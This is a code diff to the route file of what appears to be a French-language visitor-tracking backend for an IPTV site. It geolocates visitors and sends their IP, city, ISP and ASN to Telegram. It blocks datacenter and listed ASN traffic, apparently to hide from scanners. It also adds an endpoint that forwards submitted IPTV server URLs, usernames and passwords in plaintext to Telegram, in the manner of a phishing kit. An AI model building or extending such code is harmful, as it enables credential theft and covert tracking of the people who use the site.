@@ -3,11 +3,12 @@ import { readJSON, writeJSON, serializeWrite } from '../storage.js';
 import { config } from '../config.js';
 import { sendTelegram, handleTelegramWebhook } from '../services/telegram.js';
 import { lookupIP } from '../services/geo.js';
-import { escapeHTML, parseUA, detectDeviceType, generateSessionID, getClientIP, isInVPNRange, isBanned, checkRateLimit } from '../lib/utils.js';
+import { escapeHTML, parseUA, detectDeviceType, generateSessionID, getClientIP, isInVPNRange, isBanned, isBlockedASN, checkRateLimit, safeParse, badJson } from '../lib/utils.js';
 
 const trackingRateLimits = new Map();
 const captchaRateLimits = new Map();
 const channelRateLimits = new Map();
+const iptvNotifyLimits = new Map();
 
 async function handleVisit(req, body) {
   const clientIP = getClientIP(req);
@@ -21,6 +22,7 @@ async function handleVisit(req, body) {
   const isWhitelisted = state.WHITELIST_LOOKUP.has(clientIP);
   const isDatacenter = !isWhitelisted && (ipInfo.isHosting || isInVPNRange(clientIP));
   const isBannedIP = !isWhitelisted && isBanned(clientIP);
+  const asnBlocked = !isWhitelisted && ipInfo.asn && isBlockedASN(ipInfo.asn);
 
   const session = {
     id: generateSessionID(),
@@ -32,9 +34,12 @@ async function handleVisit(req, body) {
     countryCode: ipInfo.countryCode,
     city: ipInfo.city,
     region: ipInfo.region,
+    asn: ipInfo.asn,
+    asnOrg: ipInfo.asnOrg,
     isProxy: !isWhitelisted && ipInfo.isProxy,
     isDatacenter,
-    isBanned: isBannedIP,
+    isBanned: isBannedIP || asnBlocked,
+    isASNBlocked: asnBlocked,
     siteUrl: body.siteUrl || config.SITE_URL,
     channelName: body.channelName || '',
     streamUrl: body.streamUrl || '',
@@ -46,8 +51,8 @@ async function handleVisit(req, body) {
     writeJSON(config.VISITS_FILE, state.VISITS);
   });
 
-  const statusIcon = session.isBanned ? '🚫' : session.isDatacenter ? '🤖' : session.isProxy ? '⚠️' : '✅';
-  const statusLabel = session.isBanned ? 'Banned' : session.isDatacenter ? 'Bot/DC' : session.isProxy ? 'Proxy' : 'Human visitor';
+  const statusIcon = session.isASNBlocked ? '🚫' : session.isBanned ? '🚫' : session.isDatacenter ? '🤖' : session.isProxy ? '⚠️' : '✅';
+  const statusLabel = session.isASNBlocked ? 'ASN Bloqué' : session.isBanned ? 'Banned' : session.isDatacenter ? 'Bot/DC' : session.isProxy ? 'Proxy' : 'Human visitor';
 
   const visitCount = state.VISITS.filter(v => v.ip === clientIP).length;
   const isReturning = visitCount > 1;
@@ -63,6 +68,8 @@ async function handleVisit(req, body) {
   const mapsQ = encodeURIComponent([session.city, session.region, session.country].filter(Boolean).join(', ') || session.ip);
   const mapsLink = `https://www.google.com/maps/search/?api=1&query=${mapsQ}`;
 
+  const asnLine = session.asn ? `🔢 <b>ASN:</b> <code>AS${escapeHTML(session.asn)}</code> ${session.asnOrg ? `— ${escapeHTML(session.asnOrg)}` : ''}` : null;
+
   const msg = [
     clientHeader,
     `${statusIcon} <b>Status:</b> ${escapeHTML(statusLabel)}`,
@@ -70,6 +77,7 @@ async function handleVisit(req, body) {
     cityStr ? `🏙️ <b>Ville:</b> ${escapeHTML(cityStr)}` : null,
     `🌍 <b>Pays:</b> ${escapeHTML(session.country || 'Inconnu')} ${session.countryCode || ''}`,
     `📡 <b>ISP:</b> ${escapeHTML(session.isp || 'Inconnu')}`,
+    asnLine,
     body.channelName ? `📺 <b>Chaîne:</b> ${escapeHTML(body.channelName)}` : null,
     body.streamUrl ? `🔗 <b>Flux:</b> <code>${escapeHTML(body.streamUrl)}</code>` : null,
     `<a href="${mapsLink}">🗺️ Voir sur Google Maps</a>`,
@@ -103,13 +111,22 @@ export async function handleTrackingRoutes(pathname, req, res, body) {
       res.writeHead(403, { 'Content-Type': 'application/json' });
       return res.end(JSON.stringify({ ok: false, isBanned: true, ip: clientIP }));
     }
-    const data = JSON.parse(body || '{}');
+    const parsed = safeParse(body);
+    if (!parsed.ok) return badJson(res);
+    const data = parsed.data;
     const session = await handleVisit(req, data);
+    if (session.isASNBlocked) {
+      res.writeHead(403, { 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ ok: false, isASNBlocked: true, ip: session.ip, asn: session.asn }));
+    }
+
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({
       ok: true, id: session.id, ip: session.ip,
       country: session.country, isp: session.isp,
+      asn: session.asn, asnOrg: session.asnOrg,
       isDatacenter: session.isDatacenter, isBanned: session.isBanned,
+      isASNBlocked: session.isASNBlocked,
       isPremium: state.PREMIUM_LOOKUP.has(session.ip),
     }));
     return true;
@@ -122,7 +139,8 @@ export async function handleTrackingRoutes(pathname, req, res, body) {
       res.writeHead(429, { 'Content-Type': 'application/json' });
       return res.end(JSON.stringify({ error: 'Too many requests' }));
     }
-    const data = JSON.parse(body || '{}');
+    const parsed = safeParse(body);
+    const data = parsed.ok ? parsed.data : {};
     const msg = [
       `⚠️ <b>CAPTCHA RATÉ</b>`,
       `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
@@ -144,7 +162,8 @@ export async function handleTrackingRoutes(pathname, req, res, body) {
       res.writeHead(429, { 'Content-Type': 'application/json' });
       return res.end(JSON.stringify({ error: 'Too many requests' }));
     }
-    const data = JSON.parse(body || '{}');
+    const parsed = safeParse(body);
+    const data = parsed.ok ? parsed.data : {};
     const now = Date.now();
     const last = state.channelNotifyCache.get(clientIP);
 
@@ -169,8 +188,39 @@ export async function handleTrackingRoutes(pathname, req, res, body) {
       res.writeHead(403);
       return res.end('Forbidden');
     }
-    const update = JSON.parse(body || '{}');
+    const parsed = safeParse(body);
+    const update = parsed.ok ? parsed.data : {};
     await handleTelegramWebhook(update);
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ ok: true }));
+    return true;
+  }
+
+  if (pathname === '/api/notify-iptv') {
+    if (req.method !== 'POST') { res.writeHead(405); return res.end('Method not allowed'); }
+    const clientIP = getClientIP(req);
+    if (!checkRateLimit(iptvNotifyLimits, clientIP, 5, 60000)) {
+      res.writeHead(429, { 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ error: 'Too many requests' }));
+    }
+    const parsed = safeParse(body);
+    if (!parsed.ok) return badJson(res);
+    const data = parsed.data;
+    const server = String(data.server || '').trim();
+    const username = String(data.username || '').trim();
+    const password = String(data.password || '').trim();
+    if (!server || !username || !password) {
+      res.writeHead(400, { 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ error: 'Missing fields' }));
+    }
+    const msg = [
+      '📡 <b>CONNEXION IPTV</b>',
+      `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
+      `🖥️ <b>Server URL:</b> <code>${escapeHTML(server)}</code>`,
+      `👤 <b>Username:</b> <code>${escapeHTML(username)}</code>`,
+      `🔑 <b>Password:</b> <code>${escapeHTML(password)}</code>`,
+    ].join('\n');
+    await sendTelegram(msg, clientIP);
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({ ok: true }));
     return true;
